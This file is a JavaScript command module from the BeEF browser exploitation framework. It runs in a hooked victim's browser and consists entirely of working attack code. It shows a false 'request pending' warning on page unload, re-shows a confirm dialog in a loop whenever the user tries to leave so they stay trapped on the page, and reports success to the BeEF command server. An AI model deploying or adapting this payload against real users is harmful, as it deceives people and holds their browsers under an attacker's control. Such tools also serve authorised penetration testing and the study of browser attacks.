//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

    function display_confirm(){
        if(confirm("Are you sure you want to navigate away from this page?\n\n There is currently a request to the server pending. You will lose recent changes by navigating away.\n\n Press OK to continue, or Cancel to stay on the current page.")){
            display_confirm();
        }
    }

    function dontleave(e){
        e = e || window.event;

        if(beef.browser.isIE()){
            e.cancelBubble = true;
            e.returnValue = "There is currently a request to the server pending. You will lose recent changes by navigating away.";
        }else{
            if (e.stopPropagation) {
                e.stopPropagation();
                e.preventDefault();
                e.returnValue = "There is currently a request to the server pending. You will lose recent changes by navigating away.";
            }
        }

        //re-display the confirm dialog if the user clicks OK (to leave the page)
        display_confirm();
        return "There is currently a request to the server pending. You will lose recent changes by navigating away.";
    }

    window.onbeforeunload = dontleave;

	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'Module executed successfully');
});
